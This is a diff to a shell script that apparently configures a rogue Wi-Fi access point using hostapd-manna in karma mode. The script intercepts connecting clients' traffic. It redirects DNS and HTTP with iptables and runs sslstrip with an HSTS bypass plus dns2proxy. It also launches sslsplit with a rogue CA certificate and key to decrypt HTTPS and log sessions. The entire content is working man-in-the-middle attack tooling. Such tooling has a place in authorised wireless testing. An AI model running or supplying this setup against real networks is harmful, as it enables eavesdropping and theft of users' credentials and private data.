@@ -1,5 +1,5 @@
-upstream=wlan0
-phy=wlan7
+upstream=eth0
+phy=wlan6
 conf=conf/hostapd-karma.conf
 hostapd=../hostapd-manna/hostapd/hostapd
 
@@ -32,12 +32,14 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 
 #SSLStrip with HSTS bypass
-python ../sslstrip-hsts/sslstrip.py -l 10000 -a -w sslstrip.log&
+cd ../sslstrip-hsts/
+python sslstrip.py -l 10000 -a -w sslstrip.log&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-python ../sslstrip-hsts/dns2proxy.py $phy&
+python dns2proxy.py $phy&
+cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S sslsplit -c cert/rogue-ca.pem -O -l sslsplit-connect.log \
+sslsplit -D -P -Z -S sslsplit -c cert/rogue-ca.pem -k cert/rogue-ca.key -O -l sslsplit-connect.log \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
